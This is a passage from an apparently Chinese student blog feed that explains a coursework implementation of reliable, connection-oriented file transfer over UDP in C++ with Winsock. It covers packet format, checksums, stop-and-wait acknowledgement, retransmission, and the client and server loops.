buffersize;</span><br><span class="line">		b.set_endfile();<span class="comment">//添加EF标识</span></span><br><span class="line">		message::copy(msgsend[buffersize++], b);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>server端：</strong></p>
<ul>
<li><p>接收到包含<strong>SF=1</strong>的消息，读出<strong>index、filelength和文件名</strong>，返回ACK</p>
</li>
<li><p>循环接收对方发来的消息，使用<strong>多线程</strong>将<strong>msg段复制到内存中</strong>，逐条返回ACK</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//处理接收到的文件消息</span></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">filehandler</span><span class="params">(LPVOID lparam)</span></span></span><br><span class="line"><span class="function"></span>&#123;<span class="comment">//多线程函数只能传入一个参数，多个参数需要打包成class或者struct</span></span><br><span class="line">	filepacket* pkt = (filepacket*)(LPVOID)lparam;</span><br><span class="line">	<span class="built_in">memset</span>(content[pkt-&gt;index], <span class="number">0</span>, <span class="number">1024</span>);</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;pkt-&gt;length;j++)</span><br><span class="line">	&#123;<span class="comment">//可能中间会有'\0'不可以直接使用strcpy</span></span><br><span class="line">		content[pkt-&gt;index][j] = pkt-&gt;a.msg[j];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>当收到的消息包含标识为<strong>EF</strong>时，表示该条消息<strong>msg段有效位数为filelength</strong>，将其复制到内存中。校验<strong>index与收到文件消息的条数</strong>，如果正确返回ACK</p>
</li>
<li><p>将内存中的数据写入文件</p>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">outfile</span><span class="params">(<span class="keyword">char</span>* name, <span class="keyword">char</span> content[<span class="number">50000</span>][<span class="number">1024</span>], <span class="keyword">int</span> length, <span class="keyword">int</span>&amp; index)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="function">ofstream <span class="title">fout</span><span class="params">(name, ofstream::binary)</span></span>;<span class="comment">//以二进制方式写入文件</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; index; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; FILE_PACKET_LENGTH; j++)</span><br><span class="line">			fout &lt;&lt; content[i][j];<span class="comment">//以字节为单位进行写入</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; length; j++)</span><br><span class="line">		fout &lt;&lt; content[index][j];</span><br><span class="line">	fout.<span class="built_in">close</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h2><h3 id="socket的创建"><a href="#socket的创建" class="headerlink" title="socket的创建"></a>socket的创建</h3><p><strong>头文件</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;WinSock2.h&gt;//windows socket 编程头文件</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib,<span class="meta-string">"ws2_32.lib"</span>)<span class="comment">//链接ws2_32.lib库文件到此项目中</span></span></span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//加载socket库</span></span><br><span class="line">WSADATA wsaData;</span><br><span class="line"><span class="comment">//MAKEWORD(2.2),成功返回0</span></span><br><span class="line"><span class="keyword">if</span> (WSAStartup(MAKEWORD(<span class="number">2</span>, <span class="number">2</span>), &amp;wsaData) != <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"socket初始化失败"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//创建Socket</span></span><br><span class="line"><span class="comment">//创建一个socket，并将该socket绑定到一个特定的传输层</span></span><br><span class="line">sock = socket(AF_INET, SOCK_DGRAM, <span class="number">0</span>);<span class="comment">//地址类型（ipv4）,数据报套接字</span></span><br><span class="line"><span class="keyword">if</span> (sock == INVALID_SOCKET)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"socket创建失败"</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//设置recv函数为非阻塞</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">timeval</span> <span class="title">timeout</span>;</span></span><br><span class="line">timeout.tv_sec = <span class="number">1</span>;<span class="comment">//秒</span></span><br><span class="line">timeout.tv_usec = <span class="number">0</span>;<span class="comment">//微秒</span></span><br><span class="line"><span class="keyword">if</span> (setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (<span class="keyword">char</span>*)&amp;timeout, <span class="keyword">sizeof</span>(timeout)) == <span class="number">-1</span>) &#123;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"setsockopt failed:"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">"server3-1"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="comment">//初始化地址,代码支持输入IP，这里只演示了使用默认IP的情况</span></span><br><span class="line">addrop.sin_addr.s_addr = inet_addr(<span class="string">"192.168.89.1"</span>);</span><br><span class="line">addrop.sin_family = AF_INET;<span class="comment">//IPv4</span></span><br><span class="line">addrop.sin_port = htons(SPORT);<span class="comment">//端口，30000</span></span><br><span class="line"></span><br><span class="line">addr.sin_addr.s_addr = inet_addr(<span class="string">"192.168.89.1"</span>);</span><br><span class="line">addr.sin_family = AF_INET;</span><br><span class="line">addr.sin_port = htons(CPORT);<span class="comment">//6666</span></span><br><span class="line"><span class="comment">//绑定</span></span><br><span class="line"><span class="comment">//强制类型转换，SOCKADDR_IN方便赋值 SOCKADDR方便传输</span></span><br><span class="line"><span class="comment">//server端需要bind而client端不需要</span></span><br><span class="line"><span class="keyword">if</span> (bind(sock, (SOCKADDR*)&amp;addrop, <span class="keyword">sizeof</span>(SOCKADDR)) == <span class="number">-1</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"bind error"</span> &lt;&lt; <span class="built_in">endl</span>; <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line">......<span class="comment">//程序执行，消息收发</span></span><br><span class="line">closesocket(sock);<span class="comment">//关闭socket</span></span><br><span class="line">WSACleanup();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure>

<p><strong>消息的发送与接收</strong></p>
<p>为了简化后续代码，将send和recv简化封装成函数</p>
<p>注意这里由于使用的是<strong>UDP</strong>，每次发送和接收都需要<strong>指明目的或者来源IP地址</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">simplesend</span><span class="params">(message&amp; a)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	a.set_exist();<span class="comment">//表示该条消息存在，方便非阻塞式recv判断是否接收到了消息</span></span><br><span class="line">	a.setchecksum();<span class="comment">//设置校验和</span></span><br><span class="line">	<span class="comment">//用sock发送a中的内容，注意第二个参数是char*，所以需要强制类型转换</span></span><br><span class="line">    <span class="comment">//第三个参数为发送缓冲区长度，注意不能设置过长，否则会造成缓冲区溢出</span></span><br><span class="line">    <span class="comment">//第四个代表相关操作，一般设置为0</span></span><br><span class="line">    <span class="comment">//第五个是目的IP地址，即向哪个IP发送消息</span></span><br><span class="line">    <span class="comment">//第六个是addr的长度</span></span><br><span class="line">	<span class="keyword">if</span> (sendto(sock, (<span class="keyword">char</span>*)&amp;a, <span class="keyword">sizeof</span>(message), <span class="number">0</span>, (struct sockaddr*)&amp;addr, <span class="keyword">sizeof</span>(sockaddr)) == SOCKET_ERROR);<span class="comment">//如果发送失败，这里由于后续有确认重传机制，不在发送函数中进行处理</span></span><br><span class="line">	&#123;</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="comment">//打印每条发送报文标志位相关信息，方便观察传输过程，由于IO时间消耗很大，这里注释掉</span></span><br><span class="line">	<span class="comment">//if (a.flag) &#123; cout &lt;&lt; "发送 "; a.print(); &#125;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">simplerecv</span><span class="params">(message&amp; a)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">memset</span>(a.msg, <span class="number">0</span>, <span class="keyword">sizeof</span>(a.msg));<span class="comment">//初始化全为0，防止收到前面收到消息的影响</span></span><br><span class="line">    <span class="comment">//参数与sendto函数类似，只是第五项的目的IP地址改为源IP地址，即从哪个IP接收消息</span></span><br><span class="line">	recvfrom(sock, (<span class="keyword">char</span>*)&amp;a, <span class="keyword">sizeof</span>(message), <span class="number">0</span>, (struct sockaddr*)&amp;addr, &amp;addr_len);</span><br><span class="line">	<span class="comment">//if (a.flag) &#123; cout &lt;&lt; "接收 "; a.print(); &#125;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>支持用户输入IP</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//这里仅以一端作为演示</span></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">"是否使用默认IP？是1，否2 "</span>;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; i;</span><br><span class="line"><span class="keyword">if</span> (i == <span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">char</span> s[<span class="number">20</span>] = &#123;&#125;;</span><br><span class="line">    <span class="keyword">char</span> c[<span class="number">20</span>] = &#123;&#125;;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"请输入服务器IP: "</span> ;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; s;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"请输入客户端IP: "</span>;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; c;</span><br><span class="line">    addrop.sin_addr.s_addr = inet_addr(s);</span><br><span class="line">    addr.sin_addr.s_addr = inet_addr(c);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="message类"><a href="#message类" class="headerlink" title="message类"></a>message类</h3><p><strong>初始化</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">message::message() &#123;</span><br><span class="line">	<span class="built_in">memset</span>(<span class="keyword">this</span>, <span class="number">0</span>, <span class="keyword">sizeof</span>(message));<span class="comment">//初始化全0</span></span><br><span class="line">	SendPort = SPORT;<span class="comment">//这里以server端为例</span></span><br><span class="line">	RecvPort = CPORT;</span><br><span class="line">	SendIP = addr.sin_addr.s_addr;</span><br><span class="line">	RecvIP = addrop.sin_addr.s_addr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="标志位的获取与设置"><a href="#标志位的获取与设置" class="headerlink" title="标志位的获取与设置"></a>标志位的获取与设置</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">message::get_syn</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (<span class="keyword">this</span>-&gt;flag &amp; <span class="number">0x02</span>)<span class="comment">//flag的右第二位是0还是1</span></span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">message::set_syn</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (get_syn() == <span class="number">0</span>)</span><br><span class="line">		flag += <span class="number">0x02</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="消息处理流程"><a href="#消息处理流程" class="headerlink" title="消息处理流程"></a>消息处理流程</h3><h4 id="server"><a href="#server" class="headerlink" title="server"></a>server</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//server端</span></span><br><span class="line">clockstart = clock();<span class="comment">//设置timer</span></span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> flag = <span class="number">0</span>;</span><br><span class="line">        simplerecv(msgrecv[recvnextseq]);<span class="comment">//接收消息，填入收消息缓冲区</span></span><br><span class="line">        <span class="keyword">if</span> (msgrecv[recvnextseq].get_exist())<span class="comment">//收到消息且顺序正确</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (msgrecv[recvnextseq].msgseq == recvnextseq&amp;&amp;msgrecv[recvnextseq].checkchecksum())<span class="comment">//如果的消息序号正确，校验和正确</span></span><br><span class="line">            &#123;<span class="comment">//回复对该消息的ACK确认</span></span><br><span class="line">                message b;</span><br><span class="line">                b.set_ack();</span><br><span class="line">                b.ackseq = recvnextseq;</span><br><span class="line">                simplesend(b);<span class="comment">//发送消息b</span></span><br><span class="line">                clockstart = clock();<span class="comment">//重启计时器</span></span><br><span class="line">                <span class="keyword">if</span> (status &amp;&amp; msgrecv[recvnextseq].get_fin())</span><br><span class="line">                &#123;</span><br><span class="line">                    status = <span class="number">0</span>;<span class="comment">//断开连接，状态转换</span></span><br><span class="line">                    <span class="built_in">cout</span> &lt;&lt; <span class="string">"断开连接"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">                    <span class="built_in">memset</span>(msgrecv, <span class="number">0</span>, <span class="keyword">sizeof</span>(msgrecv));<span class="comment">//重置缓冲区</span></span><br><span class="line">                    recvnextseq = <span class="number">0</span>;<span class="comment">//重置</span></span><br><span class="line">                    filestatus = <span class="number">0</span>;</span><br><span class="line">                    fileseq = <span class="number">0</span>;</span><br><span class="line">                    <span class="keyword">break</span>;<span class="comment">//可以断开连接</span></span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">if</span> (msgrecv[recvnextseq].get_syn())<span class="comment">//建立连接请求</span></span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="keyword">if</span> (!buildconnectionSer())</span><br><span class="line">                            <span class="keyword">return</span> <span class="number">0</span>;<span class="comment">//建立连接失败</span></span><br><span class="line">                        <span class="keyword">else</span> status = <span class="number">1</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span> <span class="keyword">if</span> (status &amp;&amp; msgrecv[recvnextseq].get_startfile())</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="built_in">cout</span> &lt;&lt; <span class="string">"接收文件"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">                        <span class="comment">//接收文件基本信息</span></span><br><span class="line">                        <span class="built_in">memset</span>(name, <span class="number">0</span>, <span class="keyword">sizeof</span>(name));</span><br><span class="line">                        filestatus = <span class="number">1</span>;<span class="comment">//接收文件状态</span></span><br><span class="line">                        index = msgrecv[recvnextseq].index;</span><br><span class="line">                        length = msgrecv[recvnextseq].filelength;</span><br><span class="line">                        <span class="built_in">strcpy</span>(name, msgrecv[recvnextseq].msg);<span class="comment">//文件名</span></span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span> <span class="keyword">if</span> (status &amp;&amp; filestatus &amp;&amp; msgrecv[recvnextseq].get_endfile())<span class="comment">//文件发送结束</span></span><br><span class="line">                    &#123;</span><br><span class="line">                        filestatus = <span class="number">0</span>;</span><br><span class="line">                        <span class="keyword">if</span> (fileseq != index)<span class="comment">//核对接收到的文件消息条数和基本信息是否一致</span></span><br><span class="line">                        &#123;</span><br><span class="line">                            <span class="built_in">cout</span> &lt;&lt; <span class="string">"出错"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">                            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        filepacket* packet = <span class="keyword">new</span> filepacket;</span><br><span class="line">                        packet-&gt;a = msgrecv[recvnextseq];</span><br><span class="line">                        packet-&gt;index = index;</span><br><span class="line">                        packet-&gt;length = length;</span><br><span class="line">                        <span class="comment">//这里为了不让写入内存过程影响消息收发，采用多线程</span></span><br><span class="line">                        <span class="comment">//多线程函数只能传入一个参数，多余一个的需要打包成结构体</span></span><br><span class="line">                        hThread1 = ::CreateThread(<span class="literal">NULL</span>, <span class="literal">NULL</span>, filehandler, LPVOID(packet), <span class="number">0</span>, &amp;dwThreadId1);</span><br><span class="line">                        fileseq++;</span><br><span class="line">                        fileseq = <span class="number">0</span>;</span><br><span class="line">                        <span class="built_in">cout</span> &lt;&lt; <span class="string">"文件接收结束"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span> <span class="keyword">if</span> (status &amp;&amp; filestatus)</span><br><span class="line">                    &#123;</span><br><span class="line">                        fileseq++;</span><br><span class="line">                        filepacket* packet = <span class="keyword">new</span> filepacket;</span><br><span class="line">                        packet-&gt;a = msgrecv[recvnextseq];</span><br><span class="line">                        packet-&gt;index = fileseq - <span class="number">1</span>;<span class="comment">//文件消息序号</span></span><br><span class="line">                        packet-&gt;length = <span class="number">1024</span>;</span><br><span class="line">                        hThread1 = ::CreateThread(<span class="literal">NULL</span>, <span class="literal">NULL</span>, filehandler, LPVOID(packet), <span class="number">0</span>, &amp;dwThreadId1);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                recvnextseq++;<span class="comment">//正确处理当前消息，下面可以处理下一条消息了</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span><span class="comment">//消息乱序或校验和失败</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (flag % <span class="number">3</span> == <span class="number">0</span>)<span class="comment">//防止发送过多重复信息</span></span><br><span class="line">                &#123;</span><br><span class="line">                    message a;</span><br><span class="line">                    a.set_ack();</span><br><span class="line">                    a.ackseq = recvnextseq - <span class="number">1</span>;<span class="comment">//返回对最近的确认消息的ACK</span></span><br><span class="line">                    simplesend(a);</span><br><span class="line">                &#125;</span><br><span class="line">                flag++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span><span class="comment">//没有收到消息</span></span><br><span class="line">        &#123;</span><br><span class="line">            clockend = clock();<span class="comment">//计时</span></span><br><span class="line">            <span class="keyword">if</span> (status &amp;&amp; (clockend - clockstart) / CLOCKS_PER_SEC &gt;= WAIT_TIME*SENT_TIMES &amp;&amp; recvnextseq)<span class="comment">//需要接收到消息且超时</span></span><br><span class="line">            &#123;</span><br><span class="line">                status=<span class="number">0</span>;</span><br><span class="line">                <span class="keyword">break</span>;<span class="comment">//做断网处理</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    WaitForSingleObject(hThread1, INFINITE);<span class="comment">//等待当前所有进程执行完毕</span></span><br><span class="line">    outfile(name, content, length, index);<span class="comment">//文件写入</span></span><br><span class="line">    <span class="keyword">int</span> op;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"接收文件1，退出0"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; op;</span><br><span class="line">    <span class="keyword">if</span> (op == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="client"><a href="#client" class="headerlink" title="client"></a>client</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">int</span> op;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"传输文件1，退出0 "</span>;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; op;</span><br><span class="line">    <span class="keyword">if</span> (op == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">30</span>];</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"请输入文件名 "</span>;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; name;</span><br><span class="line">    <span class="comment">//将要发送的消息添加到缓冲区中</span></span><br><span class="line">    buildconnectionCli();</span><br><span class="line">    sendfile(name);</span><br><span class="line">    byecli();</span><br><span class="line">    <span class="keyword">clock_t</span> timestart = clock();<span class="comment">//开始计时</span></span><br><span class="line">    <span class="keyword">if</span> (base &lt; buffersize);<span class="comment">//还有消息未发送或者未确认</span></span><br><span class="line">    &#123;<span class="comment">//收线程和发线程</span></span><br><span class="line">        hThread2 = ::CreateThread(<span class="literal">NULL</span>, <span class="literal">NULL</span>, sendhandler, LPVOID(i), <span class="number">0</span>, &amp;dwThreadId2);</span><br><span class="line">        hThread1 = ::CreateThread(<span class="literal">NULL</span>, <span class="literal">NULL</span>, recvhandler, LPVOID(i), <span class="number">0</span>, &amp;dwThreadId1);</span><br><span class="line">        <span class="comment">//等待线程执行完毕</span></span><br><span class="line">        WaitForSingleObject(hThread1,INFINITE);</span><br><span class="line">        WaitForSingleObject(hThread2, INFINITE);</span><br><span class="line">        <span class="keyword">if</span> (base == buffersize)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; <span class="string">"文件发送结束"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">clock_t</span> timeend = clock();</span><br><span class="line">    <span class="keyword">double</span> endtime = (<span class="keyword">double</span>)(timeend - timestart) / CLOCKS_PER_SEC;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"Total time:"</span> &lt;&lt; endtime &lt;&lt; <span class="built_in">endl</span>;		<span class="comment">//s为单位</span></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"吞吐率："</span> &lt;&lt; (<span class="keyword">double</span>)(buffersize) * <span class="keyword">sizeof</span>(message)/endtime * <span class="number">8</span> / <span class="number">1024</span> / <span class="number">1024</span> &lt;&lt; <span class="string">"Mbps"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="comment">//重置，防止影响下一次发送消息</span></span><br><span class="line">    <span class="built_in">memset</span>(name, <span class="number">0</span>, <span class="keyword">sizeof</span>(name));</span><br><span class="line">    buffersize = <span class="number">0</span>;</span><br><span class="line">    base = <span class="number">0</span>;</span><br><span class="line">    sendnextseq = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">memset</span>(msgsend, <span class="number">0</span>, <span class="keyword">sizeof</span>(msgsend));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>







]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>大三上学期课程内容</tag>
        <tag>socket</tag>
        <tag>计算机网络</tag>
      </tags>
  </entry>
  <entry>
    <title>计算机网络作业3-1 基于UDP服务设计可靠传输协议并编程实现</title>
    <url>/2021/01/15/%E5%A4%A7%E4%B8%89%E4%B8%8A/%E8%AE%A1%E7%BD%91/%E8%AE%A1%E7%BD%91%E4%BD%9C%E4%B8%9A3-1/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1 id="实验3：基于UDP服务设计可靠传输协议并编程实现"><a href="#实验3：基于UDP服务设计可靠传输协议并编程实现" class="headerlink" title="实验3：基于UDP服务设计可靠传输协议并编程实现"></a>实验3：基于UDP服务设计可靠传输协议并编程实现</h1><h2 id="实验内容："><a href="#实验内容：" class="headerlink" title="实验内容："></a>实验内容：</h2><p>任务3-1：利用数据报套接字在用户空间实现面向连接的可靠数据传输，功能包括：建立连接、差错检测、确认重传。流量控制采用停等机制，完成给定测试文件的传输。</p>
<h2 id="报文格式"><a href="#报文格式" class="headerlink" title="报文格式"></a>报文格式</h2><img src="/img/loading.gif" class="lazyload" data-src="/images/大三上/计网/计网作业3-1/image-20201213165003849.png"  alt="image-20201213165003849" style="zoom: 25%;">

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> pack(1)<span class="comment">//以下内容按1Byte对齐，如果没有这条指令会以4Byte对齐，例如u_short类型会用2B存信息，2B补零，方便后续转换成char*格式</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">message</span>//报文格式</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="comment">//ACK=0x01, SYN=0x02, FIN=0x04,EXIST 0x10,startfile 0x20,endfile 0x40</span></span><br><span class="line">	<span class="keyword">int</span> flag;<span class="comment">//标志位</span></span><br><span class="line">	DWORD SendIP, RecvIP;<span class="comment">//发送端IP和接收端IP</span></span><br><span class="line">    u_short SendPort, RecvPort;<span class="comment">//发送端端口和接收端端口</span></span><br><span class="line">	<span class="keyword">int</span> msgseq;<span class="comment">//消息序号</span></span><br><span class="line">	<span class="keyword">int</span> ackseq;<span class="comment">//恢复ack时确认对方的消息的序号</span></span><br><span class="line">	<span class="keyword">int</span> index;<span class="comment">//用于描述文件大小，需要多少条消息才能传输完成（1条index=0,2条index=1，以此类推）</span></span><br><span class="line">	<span class="keyword">int</span> filelength;<span class="comment">//本次实验使用固定报文长度，故只需要告诉对方有多少条和最后一条除首部信息外有多少位有效信息</span></span><br><span class="line">	<span class="keyword">int</span> <span class="built_in">fill</span>;<span class="comment">//补零成为16bit的倍数，便于计算校验和</span></span><br><span class="line">	u_short checksum;<span class="comment">//校验和</span></span><br><span class="line">	<span class="keyword">char</span> msg[BUF_SIZE];<span class="comment">//报文的具体内容，本次实验简化为固定长度</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> pack()<span class="comment">//恢复4Byte编址格式</span></span></span><br></pre></td></tr></table></figure>

<h2 id="状态转换图与交互流程"><a href="#状态转换图与交互流程" class="headerlink" title="状态转换图与交互流程"></a>状态转换图与交互流程</h2><img src="/img/loading.gif" class="lazyload" data-src="/images/大三上/计网/计网作业3-1/image-20201213095611419.png"  alt="image-20201213095611419" style="zoom: 33%;">

<p>​        由于本次实验采用停等机制，即每次client端<strong>发送一条消息</strong>后，需要等待对方<strong>回复==对应==的ACK</strong>，才能发送下一条消息，故client端和server端（发送端和接收端）状态转换图类似，这里用一张图说明。这里黑色部分为正常情况，蓝色部分为出现异常时的处理。</p>
<p>下面简要介绍交互大致流程，具体细节将在后面对应部分详述</p>
<p><strong>client端</strong>：</p>
<ul>
<li>初始状态0</li>
<li><strong>建立连接</strong>：发送一条带有标识<strong>SYN</strong>的消息，表示希望建立连接，对方收到后回复对应的<strong>ACK</strong>，连接建立成功。当收到ACK后进入状态1</li>
<li><strong>发送文件</strong>：<ul>
<li>消息1，文件开始标识位<strong>SF=1</strong>，<strong>index=发送文件需要的消息条数-1</strong>，<strong>filelength=最后一条消息msg成员的有效位数</strong>。当收到对应的ACK后，进入状态2 。每条消息都是收到上一条对应的ACK后再发送。</li>
<li>发送文件，每条msg的有效长度固定为1024，最后一条<strong>EF=1</strong>，收到ACK后退回状态1</li>
</ul>
</li>
<li><strong>断开连接</strong>：发送一条标识为<strong>FIN</strong>的消息，对方收到后回复对应的ACK，断开连接成功，退回状态0</li>
<li>client端由于是主动发送的一端，一般情况下不会设计蓝色线条的状态跳转，但是可能会有<strong>超过重传次数</strong>情况下做出的<strong>断网处理</strong></li>
</ul>
<p><strong>server端</strong>：</p>
<p>​    - 初始：状态0</p>
<ul>
<li><p><strong>建立连接</strong>：收到一条<strong>SYN</strong>，回复对应的<strong>ACK</strong>，连接建立成功，进入状态1</p>
</li>
<li><p><strong>发送文件</strong>：收到包含<strong>SF</strong>、<strong>index</strong>、<strong>filelength</strong>的消息，开始接收文件，进入状态2。对于每条消息都返回一条<strong>ACK</strong> 。当收到包含标志位<strong>EF</strong>的消息，检查<strong>index与收到文件消息的条数</strong>，若一致，则返回<strong>ACK</strong>，退回状态1</p>
</li>
<li><p><strong>断开连接</strong>：收到包含标识为<strong>FIN</strong>的消息，返回<strong>ACK</strong>，进入状态0</p>
</li>
</ul>
<p><strong>注：</strong>当server端和client端在一定时间内没有接收或<strong>不能接收到对方的消息</strong>，需要做<strong>断网处理</strong>，即自动退回到状态0</p>
<p><strong>无异常情况下的发送流程</strong></p>
